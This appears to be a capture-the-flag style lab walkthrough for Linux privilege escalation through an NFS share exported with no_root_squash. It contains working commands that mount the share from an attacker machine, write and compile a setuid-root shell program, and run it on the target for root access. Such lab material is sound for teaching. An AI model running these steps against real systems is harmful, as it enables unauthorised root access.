**Detection**

Linux VM

1. In command line type: 
   
```
cat /etc/exports
```

![[Pasted image 20240602233846.png]]


2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

**Exploitation**

Attacker VM

1. Open command prompt and type: 
   
```
showmount -e 10.10.75.244
```

![[Pasted image 20240602233929.png]]


2. In command prompt type: 
   
```
mkdir /tmp/1
```

3. In command prompt type: 
   
```
mount -o rw,vers=2 10.10.75.244:/tmp /tmp/1
```

In command prompt type:

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```

4. In command prompt type: 
   
```
gcc /tmp/1/x.c -o /tmp/1/x
```

5. In command prompt type: 
   
```
chmod +s /tmp/1/x
```


Linux VM

1. In command prompt type: 
   
```
/tmp/x
```

2. In command prompt type: 
   
```
id
```

Answer the questions below

Click 'Completed' once you have successfully elevated the machine
